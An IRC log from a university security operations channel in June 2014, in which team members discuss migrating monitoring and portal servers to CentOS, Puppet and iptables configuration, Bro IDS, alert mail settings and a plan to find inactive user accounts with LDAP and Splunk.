2014-06-24 14:38:58	wraquel	just a thought
2014-06-24 14:39:04	soehlert	ah
2014-06-24 14:39:13	wraquel	That would be cool. A stripped down OS that only does bro
2014-06-24 14:39:26	wraquel	Like a pfsense box
2014-06-24 14:39:30	wraquel	but for bro
2014-06-24 14:39:37	wraquel	brOS.....
2014-06-24 14:39:43	soehlert	like stripped down SO
2014-06-24 14:39:51	wraquel	Yep
2014-06-24 14:40:00	soehlert	i suppose thats basically the images jon made
2014-06-24 14:40:08	wraquel	Yeah...
2014-06-24 14:40:25	soehlert	just need to brand them now
2014-06-24 14:40:28	wraquel	But, on baremetal, not virtual.
2014-06-24 14:40:34	soehlert	well right
2014-06-24 14:41:45	wraquel	Hmmm... should be easy to make this thing.... For someone with no current job, extreme coding skills, and lots of time on their hands....
2014-06-24 14:42:03	soehlert	welp that cancels out every single one of us..
2014-06-24 14:42:47	jazoff	i've been wondering how capturing works on docker
2014-06-24 14:42:55	jazoff	in theory you could run that on coreos
2014-06-24 14:43:18	jazoff	https://github.com/coolacid/docker-snort
2014-06-24 14:43:20	jazoff	is a thing...
2014-06-24 14:43:39	soehlert	hah cool
2014-06-24 14:44:25	soehlert	seriously. i had to email a linux sysadmin "-A FORWARD -j REJECT"
2014-06-24 14:44:34	jazoff	though it's poorly written, oh well
2014-06-24 14:44:48	jazoff	guy is using supervisor but then manually starting and managing procs... that's what supervisor is FOR
2014-06-24 14:45:46	jazoff	but if pf_ring just works inside a docker container.. that is interesting
2014-06-24 16:20:12	soehlert	jazoff: how do you want to go about rebuilding your machines as centos?
2014-06-24 16:23:31	jazoff	which machines?
2014-06-24 16:23:58	soehlert	munin, and the bro machines i guess are the only ones i can think off the top of my head
2014-06-24 16:24:04	soehlert	oh and portal
2014-06-24 16:24:46	jazoff	well, the bro workers should be easy
2014-06-24 16:25:00	jazoff	one thing that is not in puppet is the myricom drivers though
2014-06-24 16:25:17	soehlert	think thats possible? or just not really well done in puppet?
2014-06-24 16:25:26	jazoff	yeah, it's just not there at all
2014-06-24 16:25:35	jazoff	they were already installed when I got here and I just have no idea how that is done
2014-06-24 16:25:41	soehlert	i meant not really well done as in it cant really be done well?
2014-06-24 16:25:50	jazoff	just hasn't come up
2014-06-24 16:26:08	soehlert	ok portal and munin...how bout those?
2014-06-24 16:26:10	jazoff	for munin the easiest thing to do is just reprovision a new one and rsync the munin data directory over and then turn off the old one
2014-06-24 16:26:27	jazoff	similar for portal, just backup/restore the postgresql database on the new box
2014-06-24 16:27:07	soehlert	ok i'll build you new machines and leave the dhcp address until you get the stuff backed up and moved over and then i'll switch the ips over after we turn off the old ones.
2014-06-24 16:29:26	soehlert	also, whats the netflowsec-dev vm on the esx stuff. anyone know whose that is? its not jon's nor is it mine.
2014-06-24 16:30:34	jazoff	i think wraquel ?
2014-06-24 16:30:41	jazoff	there is a machine called flows-sec right?
2014-06-24 16:30:50	soehlert	ya and thats a hardware machine
2014-06-24 16:46:27	jazoff	ah
2014-06-24 16:46:53	soehlert	jazoff: what units is the duration field in conn.log
2014-06-24 17:15:16	jazoff	seconds i believe
2014-06-25 08:16:22	jazoff	so that new BWAM ticket has status = OPEN
2014-06-25 08:16:48	jazoff	so i think we just need to s/in progress/open/ in the check program
2014-06-25 09:47:44	wraquel	or !~ closed
2014-06-25 09:47:53	wraquel	/closed/resolved/
2014-06-25 11:20:47	soehlert	so thats strange. it bwbh_user_check worked today
2014-06-25 11:22:26	jazoff	did someone change it to in progress after I looked at it this morning?
2014-06-25 11:22:42	soehlert	nope i didnt touch my local copy and didnt do a git pull
2014-06-25 11:29:56	jazoff	er, i mean changed the ticket :)
2014-06-25 11:30:17	soehlert	ahhh. i didnt touch that either
2014-06-25 11:47:05	wraquel	Did you make 2 git repos for IP management and Incident Reports? Did you make any others for anything?
2014-06-25 11:47:30	soehlert	i made one for incident reports and one for secops stuff. so hosts list and ip usage for now
2014-06-25 11:47:36	wraquel	k
2014-06-25 11:47:49	soehlert	tar zxf puppet3.tar.gz
2014-06-25 11:47:54	soehlert	whoops.wrong winder..
2014-06-25 11:50:03	wraquel	How much space is on git-sec? Can we store large log files if necessary in git for incident reports, or is that impractical?
2014-06-25 11:50:29	soehlert	based on what ive heard it sounds like maybe a git-annex would be in order for that type of thing
2014-06-25 11:50:39	wraquel	?
2014-06-25 11:50:59	soehlert	jazoff can fill you in. ive never played with one, but ive heard him discuss before
2014-06-25 11:51:40	wraquel	ah
2014-06-25 11:51:41	wraquel	I see
2014-06-25 11:51:46	wraquel	That looks cool
2014-06-25 11:53:19	jazoff	yep, it's good for that sort of thing
2014-06-25 12:02:58	jazoff	not sure if it works with gitlab
2014-06-25 12:03:12	jazoff	though that would just be for storing files directly on the gitlab host, which isn't really a requirement
2014-06-25 12:05:40	wraquel	Yeah, gitlab access is not a requirement.
2014-06-25 12:09:37	jazoff	appaerntly it used to work with gitlab when they used a component from gitolite, but they switch to something they wrote
2014-06-25 12:13:30	wraquel	http://deis.io/overview/
2014-06-25 12:14:05	wraquel	want to run your own heroku service?
2014-06-25 12:14:19	jazoff	yes :) its not ready yet though
2014-06-25 12:14:33	jazoff	between that, flynn, and coreos it will be in  year
2014-06-25 12:22:59	soehlert	jazoff: new munin sec is up. 10.142.148.95 cant do kerberos auth yet. lemme know when all the stuff is transferred over
2014-06-25 12:28:38	jazoff	ok
2014-06-25 12:33:17	wraquel	So the open source PaaS stuff is still not quite there...
2014-06-25 12:34:24	jazoff	nope.. but moving very fast
2014-06-25 12:34:49	jazoff	things like https://github.com/progrium/dokku work OK i think
2014-06-25 12:36:01	wraquel	interesting.
2014-06-25 12:38:16	jazoff	soehlert: did you set role/profile for the new box?
2014-06-25 12:39:08	soehlert	did not. forgot that part :) will go do that now
2014-06-25 12:40:37	soehlert	ok done
2014-06-25 12:42:34	jazoff	now it's doing stuff :)
2014-06-25 12:44:26	soehlert	muh bad
2014-06-25 13:04:12	jazoff	ok, /var/lib/munin moved over
2014-06-25 13:04:22	jazoff	let it sit for 30 minutes or so
2014-06-25 13:04:31	jazoff	make sure everything is updated then we can switch dns
2014-06-25 13:04:32	soehlert	got it
2014-06-25 13:04:43	jazoff	i added 10.142.148.95 munin-sec.internal.ncsa.edu to my /etc/hosts for testing
2014-06-25 13:04:56	soehlert	well dns isnt going to change. old one will go off and the new one will be moved to .75
2014-06-25 13:05:34	jazoff	ah, that then :)
2014-06-25 13:10:28	jazoff	any idea what is up with brototype?
2014-06-25 13:10:36	jazoff	it was moved or whatever but now it's down again
2014-06-25 13:10:42	soehlert	ya adam secured a better rack so he's moving a whole bunch of stuff around
2014-06-25 13:10:56	soehlert	oh idk then. i think they're still moving stuff so i would assume its related to that
2014-06-25 13:11:19	jazoff	ah
2014-06-25 13:11:21	 *	jazoff shrugs
2014-06-25 13:11:29	 *	soehlert shrugs as well
2014-06-25 13:15:46	jazoff	ahh, updates aren't working
2014-06-25 13:15:47	jazoff	2014/06/25 13:15:35 Failed to connect to node derecho.ncsa.illinois.edu:4949/tcp : No route to host
2014-06-25 13:16:07	soehlert	wait updates arent working on what now?
2014-06-25 13:16:11	jazoff	oooh, that's from iptables
2014-06-25 13:16:11	jazoff	munin
2014-06-25 13:17:13	soehlert	wait so iptables isn't updated right?
2014-06-25 13:17:21	jazoff	nooo
2014-06-25 13:17:26	jazoff	the nodes are configused to only allow 10.142.148.75
2014-06-25 13:17:29	jazoff	not the temp new ip
2014-06-25 13:17:34	soehlert	ahhh oh right
2014-06-25 13:17:55	jazoff	i'll add the temp ip for now
2014-06-25 13:19:04	jazoff	ok, will repeat process in an hour or so
2014-06-25 13:19:17	soehlert	so don't change anything for an hour?
2014-06-25 13:19:49	jazoff	correct
2014-06-25 13:20:02	jazoff	i'm going to let puppet run on the various boxes which will add the iptables rule
2014-06-25 13:20:10	jazoff	then re- copy the data to the new box
2014-06-25 13:20:15	jazoff	then wait 10 minutes to see if it's updating
2014-06-25 13:20:24	jazoff	if so, we should be good to go
2014-06-25 13:20:26	soehlert	ok
2014-06-25 13:20:26	soehlert	i'll start working on portal in a few then and we can repeat this process :)
2014-06-25 13:21:31	jazoff	ok
2014-06-25 13:24:53	jazoff	portal should be pretty much the same process
2014-06-25 13:25:29	jazoff	oh, still need to puppetize the jira notify thing
2014-06-25 13:25:36	jazoff	but other than that everything should move over
2014-06-25 13:25:36	soehlert	jira notify?
2014-06-25 13:25:44	jazoff	the thing that sys
2014-06-25 13:25:55	jazoff	11:26 < ncsabot> JIRA closed Ticket BWAM-2473 Account Removal (Michael Kuhlen) https://jira.ncsa.illinois.edu/browse/BWAM-2473
2014-06-25 13:26:06	soehlert	ahhh ok
2014-06-25 13:26:24	jazoff	this is where the heroku stuff would be nice
2014-06-25 13:26:36	soehlert	?
2014-06-25 13:26:41	jazoff	for deployment
2014-06-25 13:26:45	soehlert	ah
2014-06-25 13:26:52	jazoff	you have a script you want to run 24/7 and don't care where it runs
2014-06-25 13:26:55	jazoff	heroku create ..
2014-06-25 13:27:11	jazoff	echo script: ./script.py > Procfile
2014-06-25 13:27:15	jazoff	git push heroku master
2014-06-25 13:27:18	jazoff	pretty much :)
2014-06-25 14:06:22	jazoff	no meeting?
2014-06-25 14:06:51	soehlert	call me: (217)300-1076
2014-06-25 14:08:36	soehlert	are you on mute?
2014-06-25 14:08:48	jazoff	i can hear you...
2014-06-25 14:08:53	soehlert	we cant hear you
2014-06-25 14:08:56	jazoff	is your volume down?
2014-06-25 14:09:18	jazoff	bro stuff. moving munin (related to centos switchover)
2014-06-25 14:21:01	jazoff	ah, i had modified /etc/hosts on munin-sec since the nids boxes weren't in dns
2014-06-25 14:22:44	jazoff	will paste it onto the new box, but need to come up with a better solution for that
2014-06-25 14:24:06	soehlert	ya i think we got lazy and never finished the puppet modulet o do that?
2014-06-25 14:24:24	jazoff	yeah.. puppet can add entries to /etc/hosts
2014-06-25 14:24:29	jazoff	or just have neteng add them to dns
2014-06-25 14:24:48	soehlert	oh ya we can do that. when we switch them over, we can register them 
2014-06-25 14:25:39	jazoff	yeah, i think that's why we never did it via puppet
2014-06-25 14:25:48	soehlert	ok i'll do that then
2014-06-25 14:40:12	soehlert	jazoff: bwbh_user_check found yesterday's ticket too apparently..
2014-06-25 14:41:25	soehlert	oh crap. and not todays..
2014-06-25 14:53:42	jazoff	try changing the in progress to open
2014-06-25 14:54:42	eyrich	pipe '$0' /bin/mail -s "SEC ALERT TEST" -r "security-alerts@ncsa.illinois.edu"  security-alerts@ncsa.illinois.edu
2014-06-25 14:55:03	eyrich	pipe '$0' /bin/mail -s "SEC ALERT!!! %s" -r "security-alerts@ncsa.illinois.edu"  security-alerts@ncsa.illinois.edu
2014-06-25 14:55:46	jazoff	what's that from?
2014-06-25 14:56:25	soehlert	we're making sec alerts come from me
2014-06-25 14:56:29	soehlert	come from not me*
2014-06-25 15:00:24	soehlert	failing at making sec alerts not come from me*
2014-06-25 15:01:24	jazoff	how come they come from you in the first place?
2014-06-25 15:04:21	soehlert	no idea. no matter how many times we restart and do it as another user. its always from me. not hardcoded anywhere i could find..
2014-06-25 15:04:50	jazoff	what box is it coming from?
2014-06-25 15:05:17	soehlert	analysis-sec
2014-06-25 15:05:17	soehlert	also, portal is ready for you to move stuff over. 10.142.148.90 and secops user for now
2014-06-25 15:07:05	jazoff	ok
2014-06-25 15:13:45	jazoff	ah
2014-06-25 15:13:51	jazoff	it's something sudo is doing
2014-06-25 15:14:22	jazoff	or sendmail...
2014-06-25 15:14:34	jazoff	i logged in as secops and sudo su -'d and mail shows as coming from secops
2014-06-25 15:14:40	jazoff	that's the ctladdr thing inthe log
2014-06-25 15:20:26	jazoff	that's weird at least, another reason to not use sendmail? :)
2014-06-25 15:26:10	eyrich	agreed - postfix for life :)
2014-06-25 15:26:37	jazoff	munin looks like it is working, will let it run over night i guess
2014-06-25 15:26:45	jazoff	if the charts look the same tomorrow we can switchover
2014-06-25 15:27:02	jazoff	puppet changing tons of stuff on new portal vm
2014-06-25 15:27:05	eyrich	i restarted SEC with sudo su instead of sudo - 
2014-06-25 15:27:07	eyrich	fixed?
2014-06-25 15:27:17	eyrich	instead of sudo su -
2014-06-25 15:27:40	eyrich	something in the init.d script?
2014-06-25 15:27:42	jazoff	i think that may have done it
2014-06-25 15:27:57	jazoff	well one of the many issues with init is that it doesn't clean out the environment
2014-06-25 15:29:26	jazoff	ah, can't easily push portal site to portal-sec without kerberos...
2014-06-25 15:31:26	wraquel	What time is the germany game tomorrow?
2014-06-25 15:31:46	jazoff	put 'world cup' into google
2014-06-25 15:32:00	wraquel	looks like 11am.
2014-06-25 15:32:08	jazoff	yeah, noon in the cool people timezone
2014-06-25 15:32:09	wraquel	BEAP training is at 1
2014-06-25 15:32:34	wraquel	Man, right near the end. Maybe I'll attend a later meeting.
2014-06-25 15:33:36	eyrich	beap is no longer mandatory
2014-06-25 15:34:06	wraquel	really?
2014-06-25 15:34:39	eyrich	only if you are the floor coordinator
2014-06-25 15:34:50	eyrich	at least that is what I was told earlier today
2014-06-25 15:34:56	wraquel	ahh.. It's mandated you either participate OR read.
2014-06-25 15:35:10	wraquel	The University of Illinois and the Federal Emergency Management Agency are mandating that all employees either participate OR read over the Building Emergency Action Plan (BEAP) training this summer. 
2014-06-25 15:35:31	wraquel	No link to the beap
2014-06-25 15:35:51	eyrich	http://illinois.edu/1786/finalized_ncsa_plan_08_2012.pdf
2014-06-25 15:36:07	wraquel	If anyone is interested: Registration now open for Linux Clusters Institute Workshop on HPC fundamentals
2014-06-25 15:36:26	wraquel	oh
2014-06-25 15:36:30	wraquel	$375
2014-06-25 15:36:48	wraquel	nvm
2014-06-25 15:39:32	eyrich	jonathan Howell is still on the NCSA beap
2014-06-25 15:39:58	eyrich	updated on: http://illinois.edu/1786/ncsa_beap_as_of_5_21_2013.pdf
2014-06-25 15:50:02	jazoff	new portal seems to be working
2014-06-25 16:37:46	jazoff	wonder how long before everyone is just running coreos stuffs
2014-06-26 09:20:38	wraquel	ok....
2014-06-26 09:21:40	wraquel	I need to be able to run ldapsearch from a 10.5 host to pull down the active user list from ldap
2014-06-26 09:21:59	wraquel	I can do it from bwbh just fine
2014-06-26 09:22:35	wraquel	But I need to run it automatically and then consume the resulting list.
2014-06-26 09:23:04	wraquel	I'd prefer a script running from one of our hosts.
2014-06-26 09:23:16	wraquel	But that just doesn't seem right.
2014-06-26 09:27:45	jazoff	well, you can 'ssh ... ldapsearch ... | ...'
2014-06-26 09:28:46	wraquel	2fa
2014-06-26 09:29:03	wraquel	I want a way to automate this
2014-06-26 09:29:11	wraquel	Uh oh. Something just fell over outside my door
2014-06-26 09:30:28	jazoff	can you have the automated script run on the 10.5 host and push the results someplace else?
2014-06-26 09:30:40	wraquel	yeah.
2014-06-26 09:38:27	soehlert	what's wrong with running it on the bastions?
2014-06-26 09:41:58	wraquel	For now that's fine. But how? As a script from my user? from the secops user?
2014-06-26 09:42:06	wraquel	Just looking for a good long term solution
2014-06-26 09:44:28	soehlert	secops user probably would be best
2014-06-26 09:46:51	wraquel	Ok, once I have that list, need to put it somewhere where I can run it against RSA logins from the last 60 days.
2014-06-26 09:47:06	wraquel	Best one of our hosts to run that from?
2014-06-26 09:47:20	wraquel	And have to get that list from bwbh to that host.
2014-06-26 09:48:30	wraquel	maybe analysis-sec?
2014-06-26 09:49:42	soehlert	maybe we can do some wizardry where bwbh posts to the portal and then analysis-sec also posts to the portal and they do stuff with the data and have a nice clean way to look at it..?
2014-06-26 09:50:02	jazoff	what about just log to splunk and run a report?
2014-06-26 09:50:08	jazoff	the rsa stuff is in splunk already
2014-06-26 09:50:13	soehlert	or that....i forget splunk makes that easier
2014-06-26 09:50:17	wraquel	Yeah, that's what I was thinking
2014-06-26 09:50:21	jazoff	ahh
2014-06-26 09:50:26	jazoff	just need an active user list lookup table
2014-06-26 09:50:32	jazoff	i think
2014-06-26 09:50:43	jazoff	what exactly are you doing with the two lists?
2014-06-26 09:50:47	wraquel	So, need a way to get the active user list from bwbh to cyclone
2014-06-26 09:50:49	jazoff	seeing if users are in one but not the other?
2014-06-26 09:50:53	wraquel	Yes.
2014-06-26 09:50:57	jazoff	which direction?
2014-06-26 09:50:59	wraquel	Need identify non-active users.
2014-06-26 09:51:00	jazoff	active but not logging in?
2014-06-26 09:51:05	wraquel	The full userlist from ldap.
2014-06-26 09:51:14	wraquel	The active users from splunk
2014-06-26 09:51:24	wraquel	I need the in-active users in the last 60 days.
2014-06-26 09:51:37	jazoff	you mean, exists in the userlist but not in the rsa logs?
2014-06-26 09:51:55	wraquel	yes
2014-06-26 09:51:55	soehlert	i think we want to push from the bastion here too btw
2014-06-26 09:52:10	wraquel	'here'?
2014-06-26 09:52:16	soehlert	in this case here
2014-06-26 09:52:20	wraquel	ah
2014-06-26 09:52:22	soehlert	not here physically speaking
2014-06-26 09:52:39	wraquel	Yeah. Best way to get from bwbh to cyclone?
2014-06-26 09:55:40	soehlert	scp via cron?
2014-06-26 09:55:42	jazoff	hmm, well you could just log the data to syslog
2014-06-26 09:55:51	soehlert	ooo or thats a sneaky way
2014-06-26 09:55:54	jazoff	how many entries would that be?
2014-06-26 09:56:04	wraquel	And2064
2014-06-26 09:56:06	wraquel	2063
2014-06-26 09:56:22	jazoff	would this be once a  day/week/month ?
2014-06-26 09:56:32	wraquel	weekly would probably be ideal
2014-06-26 09:56:38	jazoff	that's not too much data
2014-06-26 09:56:52	wraquel	in syslog?
2014-06-26 09:57:21	wraquel	Not entirely comfortable with that.
2014-06-26 09:58:55	jazoff	ok, no problem
2014-06-26 09:59:08	jazoff	you can't query this ldap server from cyclone i take it?
2014-06-26 09:59:44	soehlert	nah its on the 10.5 special admin net
2014-06-26 10:00:23	wraquel	are bwbh in puppet?
2014-06-26 10:04:34	soehlert	sorta.
2014-06-26 10:05:00	wraquel	Can we push a script in git over to the secops user on bwbh?
2014-06-26 10:05:12	wraquel	I guess is what I was getting at
2014-06-26 10:07:31	soehlert	oh ya we should be able to pull that off
2014-06-26 10:08:10	soehlert	currently the bastion profiles just push fw rules out but we can push a script out
2014-06-26 10:08:10	soehlert	although...this probably needs change control :(
2014-06-26 10:08:35	wraquel	That's fine. bill wants this anyway.
2014-06-26 10:09:07	soehlert	ah then it should get through quickly. ya it would be really easy to push that script out via puppet then
2014-06-26 10:10:16	wraquel	Since it's via puppet, it'll push it out to both hosts right?
2014-06-26 10:10:42	soehlert	yes. though we can limit it if you want
2014-06-26 10:11:05	soehlert	bwbh2 has its own profile because of the keepass stuff
2014-06-26 10:11:20	wraquel	ah
2014-06-26 10:11:23	wraquel	that can work then
2014-06-26 10:27:40	jazoff	well, put bro 2.3 on supercell
2014-06-26 10:28:41	soehlert	any big features new to 2.3
2014-06-26 10:28:44	soehlert	?
2014-06-26 10:28:53	jazoff	no
2014-06-26 10:28:56	jazoff	mostly performance stuff
2014-06-26 10:32:11	wraquel	Seeing any improvements then?
2014-06-26 10:32:41	jazoff	about the same :)
2014-06-26 10:36:41	jazoff	keist: does the nagios command thing look like it is working?
2014-06-26 10:46:35	jazoff	soehlert: munin-sec should be ready to go now
2014-06-26 10:46:49	jazoff	oh, lemme copy data once more
2014-06-26 10:47:51	jazoff	there was one straggler last night due to a puppet error
2014-06-26 10:49:58	jazoff	ok
2014-06-26 10:58:02	soehlert	jazoff: ok as in go ahead and switch or ok its copying?
2014-06-26 10:58:11	jazoff	switch
2014-06-26 10:58:39	soehlert	k
2014-06-26 11:05:23	soehlert	jazoff: ip switched and kerb auth working
2014-06-26 11:06:16	jazoff	looks good
2014-06-26 11:06:49	soehlert	actually it needs some updates. care if i reboot?
2014-06-26 11:07:04	soehlert	i should add that in my to do before i call these good to go as i switch them over
2014-06-26 11:10:28	jazoff	:)
2014-06-26 11:10:40	soehlert	is that a go ahead..?
2014-06-26 11:10:49	jazoff	yes, now
2014-06-26 11:11:01	jazoff	munin runs at /5 and finishes about a minute later
2014-06-26 11:13:20	soehlert	ok good to go
2014-06-26 11:21:45	jazoff	going to make lunch.. do portal-sec switch later today?
2014-06-26 11:22:10	soehlert	sounds good
2014-06-26 11:46:59	keist	where's the volleyball invitation answers :/
2014-06-26 11:54:49	soehlert	i'll be there
2014-06-26 11:57:56	keist	sweet, wardog?
2014-06-26 11:59:22	keist	wraquel: I mean
2014-06-26 12:38:21	jazoff	soehlert: oook
2014-06-26 12:38:27	jazoff	soehlert: can you switch the portal ips?
2014-06-26 12:44:23	soehlert	gimme a bit
2014-06-26 13:03:34	wraquel	we'll see
2014-06-26 13:09:28	keist	Moved relay01, relay02, analysis-sec, open-nsm, mousetooth, spicymango, and smokeping to CentOS
2014-06-26 13:13:23	wraquel	How are you going to do the syslog transistion?
2014-06-26 13:15:46	soehlert	sounds like he already did..
2014-06-26 13:16:26	wraquel	syslog-sec?
2014-06-26 13:16:43	wraquel	Which system is the one that all the syslog is stored on?
2014-06-26 13:16:53	wraquel	seclogs
2014-06-26 13:18:56	soehlert	seclogs
2014-06-26 13:19:04	soehlert	he hasnt done that one
2014-06-26 13:19:04	soehlert	im assuming hes leaving it fo rme
2014-06-26 13:23:00	wraquel	whee
2014-06-26 13:23:55	jazoff	ccccccbthrrndnukhiugtrkcfnvtdhulbfinrgjekuru
2014-06-26 13:23:57	jazoff	derp
2014-06-26 13:24:01	soehlert	?
2014-06-26 13:24:05	jazoff	ubikey
2014-06-26 13:24:06	soehlert	that was unexpected
2014-06-26 13:24:08	wraquel	At least it wasn't on #ops
2014-06-26 13:24:14	wraquel	I did that two weeks ago
2014-06-26 13:29:31	keist	soehlert: yep, you built one so leaving it to you
2014-06-26 13:29:37	keist	built that one*
2014-06-26 13:29:54	soehlert	thats what i figured. all good
2014-06-26 13:30:13	keist	jazoff: no, command isn't working for the nagios-api
2014-06-26 13:30:22	keist	I messaged you about it yesterday
2014-06-26 13:30:25	jazoff	keist: oh?
2014-06-26 13:30:29	jazoff	i didn't see
2014-06-26 13:30:38	wraquel	what's up with the nagios pages?
2014-06-26 13:30:39	jazoff	soon as portal comes back up we can test again
2014-06-26 13:30:45	keist	kk
2014-06-26 13:31:53	soehlert	portals up just no kerb auth yet
2014-06-26 13:32:01	keist	you mean why was portal-sec unreachable? 
2014-06-26 13:32:35	soehlert	no i mean i shut it down to do the switchover. its back up now
2014-06-26 13:32:35	soehlert	just no kerberos auth yet 
2014-06-26 13:34:19	keist	I was rephrasing Warren's question
2014-06-26 13:34:27	soehlert	ah ok didnt see that my bad
2014-06-26 13:34:38	soehlert	and my bad on the nagios pages...didnt mark for maintenance
2014-06-26 13:35:38	soehlert	kerberos auth working on portal
2014-06-26 13:35:47	keist	no biggie
2014-06-26 13:44:51	wraquel	I have a meeting from 4 to 5. If I can make it I'll stop after.
2014-06-26 13:45:14	jazoff	soehlert: things look good
2014-06-26 13:47:16	soehlert	sweet
2014-06-26 13:56:15	soehlert	jazoff: you wanna try to fix the jira stuff with me?
2014-06-26 13:56:15	soehlert	we have an open ticket currentl
2014-06-26 13:56:27	jazoff	sure
2014-06-26 13:57:22	soehlert	ok you mentioned something about changing one of the fields for testing..?
2014-06-26 13:57:26	soehlert	status i think
2014-06-26 13:57:49	jazoff	yeah, to open
2014-06-26 13:58:33	soehlert	oh this one is already listed as open
2014-06-26 13:59:15	jazoff	yes, but the script searches for in progress
2014-06-26 13:59:36	soehlert	oh you mean change the script to say open..
2014-06-26 13:59:36	soehlert	duh
2014-06-26 14:00:37	soehlert	easy enough..good work team
2014-06-26 14:01:02	soehlert	weird that changed it to "in progress" though.
2014-06-26 14:01:02	soehlert	i guess that doesn't affect us though
2014-06-26 14:03:25	jazoff	yeah so I guess just change the script to look for open or in progress
2014-06-26 14:03:34	soehlert	oh how do i do an or?
2014-06-26 14:04:17	soehlert	AND status = "open" OR status = "in progress"
2014-06-26 14:06:28	jazoff	AND (status = "open" OR status = "in progress")
2014-06-26 14:07:06	soehlert	done
2014-06-26 14:07:16	jazoff	though that finds two tickets right now
2014-06-26 14:07:27	jazoff	seems like they are assigned to  Christopher Pond  and not melliot
2014-06-26 14:07:50	soehlert	check script doesnt seem to find them
2014-06-26 14:08:53	soehlert	i just ran that search too and dont see any tickets coming back
2014-06-26 14:09:01	jazoff	ah
2014-06-26 14:09:24	soehlert	script looks fine. the other ticket is onto chris pond becuase a few people have touched it already
2014-06-26 14:44:09	wraquel	So.... regarding git and Incident Reports. Nothing to worry about right now but what's the best way to handling creating new reports from without the commandline without also having to download every other report in the repo
2014-06-26 14:45:36	jazoff	how do you mean?
2014-06-26 14:45:47	soehlert	that's a confusingly worded question
2014-06-26 14:45:48	jazoff	what's wrong with having a copy of all the reports?
2014-06-26 14:45:54	wraquel	:D
2014-06-26 14:46:41	wraquel	There's no problem with it right now. Just thinking it can get unruly after a while. Not that we see that many incidents.
2014-06-26 14:46:56	soehlert	what can get unruly? not sure what you're trying to get at
2014-06-26 14:47:11	soehlert	just that there might be a bunch of reports?
2014-06-26 14:47:36	wraquel	Yeah, but we can curb that by separating by something like year.
2014-06-26 14:48:14	soehlert	ya year will probably be fine. we could do month if we end up having to, but that will be overkill based on the amount we see..
2014-06-26 14:48:31	wraquel	I was thinking forward if the repo size gets too large, but I'm guessing that won't be an issue for a long time.
2014-06-26 14:48:41	wraquel	If at all
2014-06-26 14:48:48	soehlert	well we can archive the reports after a certain number of years maybe?
2014-06-26 14:49:13	wraquel	easy enough.
2014-06-26 14:49:15	soehlert	after x years just encrypt them and transfer to our long term storage?
2014-06-26 14:49:53	jazoff	well if we end up using git-annex
2014-06-26 14:49:57	jazoff	the only files in the git repo would be tiny
2014-06-26 14:50:06	jazoff	and you can pick and chose what large files you want with git annex
2014-06-26 14:50:17	wraquel	works.
2014-06-26 15:02:14	jazoff	yeah.. it works kinda like ftp if you use the cli
2014-06-26 15:02:17	jazoff	so you could do like
2014-06-26 15:02:24	jazoff	git annex drop 2013
2014-06-26 15:02:26	jazoff	git annex get 2014
2014-06-26 15:02:42	jazoff	to remove local copies of any large files from 2013, and grab all the ones from 2014
2014-06-26 15:51:15	jazoff	wraquel: for that ldap thing you were talking about..
2014-06-26 15:51:33	jazoff	would it also just work to report in splunk who has logged in in the last like 180 days, but not the last 30 days?
2014-06-26 15:51:52	jazoff	since that could be done directly from syslog
2014-06-26 15:54:59	wraquel	Well, the ultimate goal is to determine which accounts have not been used in the last 60 days.
2014-06-26 15:55:50	jazoff	right..  comparing to ldap would definitely be 100% accurate there
2014-06-26 15:56:17	jazoff	but finding all accounts that have a last seen of > 60 days would be a start
2014-06-27 09:49:05	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-06-27 09:49:05	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-06-27 09:49:07	--	Mode #security [+]
2014-06-27 09:49:07	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-06-27 09:49:52	soehlert	jazoff: have you updated your nexus in the last day or so?
2014-06-27 09:59:58	jazoff	yeah to 4.4.4
2014-06-27 10:01:28	soehlert	ive been having major issues have you?
2014-06-27 10:02:04	jazoff	no
2014-06-27 10:02:21	soehlert	damn. my phone just slows to a crawl and reboots randomly
2014-06-27 10:04:05	wraquel	You have a virus
2014-06-27 10:04:22	soehlert	guess i shoulda stayed home to take care of my sick phone
2014-06-27 10:04:26	wraquel	I can fix it for $2000.
2014-06-27 10:04:30	wraquel	No refunds.
2014-06-27 10:04:39	soehlert	that sounds fair
2014-06-27 10:27:48	eyrich	the arp watch for 10.5.0.1 is something to do with CARP, the mac addresses listed are the physical interface on bwfw1 and the carp interface
2014-06-27 10:28:06	eyrich	i would suggest telling arpwatch to ignore
2014-06-27 10:28:30	soehlert	OSSEC or arpwatch?
2014-06-27 10:29:14	eyrich	or maybe this patcH;
2014-06-27 10:29:16	eyrich	http://lists.freebsd.org/pipermail/freebsd-net/2006-November/012476.html
2014-06-27 10:35:01	wraquel	jazoff: yes. that's where splunk comes in. It'll be easy to make a search for that last 60 days.
2014-06-27 11:39:45	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-06-27 13:28:26	soehlert	jazoff: nagios is saying somethings wrong with portal-sec ninfo and portal WUI
2014-06-27 13:29:14	jazoff	yeah, added some new pages
2014-06-27 13:29:20	jazoff	deploying seems to have broken it for some reason
2014-06-27 13:29:29	soehlert	ah ok as long as youre aware
2014-06-27 13:34:42	jazoff	weird
2014-06-27 13:35:12	soehlert	?
2014-06-27 13:37:00	jazoff	it's randomly working/not working
2014-06-27 13:37:15	soehlert	whatd you add?
2014-06-27 13:37:18	jazoff	nothing
2014-06-27 13:37:22	jazoff	looks like 1 of the 2 procs is broken
2014-06-27 13:37:27	jazoff	no idea how that would happen
2014-06-27 13:37:28	soehlert	you said you added new pages..
2014-06-27 13:38:03	jazoff	yeah, but they are fine
2014-06-27 13:38:38	soehlert	i was just curious wasnt blaming them :)
2014-06-27 13:38:52	jazoff	restarted apache and now it looks ok again
2014-06-27 13:47:29	jazoff	i built https://portal-sec.internal.ncsa.edu/http_whitelist/
2014-06-27 13:47:59	soehlert	ah thats cool
2014-06-27 13:48:55	jazoff	grr, and I deployed again and it broke again
2014-06-27 13:49:26	soehlert	hmm weird. clearly something in your deployment script is off..
2014-06-27 13:50:25	jazoff	nope
2014-06-27 13:50:36	jazoff	something that started happening since the centos migration
2014-06-27 13:50:39	jazoff	though i have no idea what
2014-06-27 13:51:03	soehlert	so this has happened since the migration before you just deployed this stuff
2014-06-27 13:52:05	jazoff	hmm?
2014-06-27 13:52:27	soehlert	are you suggesting you were seeing these problems on centos before just now?
2014-06-27 13:52:37	jazoff	huh? 
2014-06-27 13:52:39	jazoff	i'm confused
2014-06-27 13:52:46	jazoff	this is the first time this problem has hapened after deploying
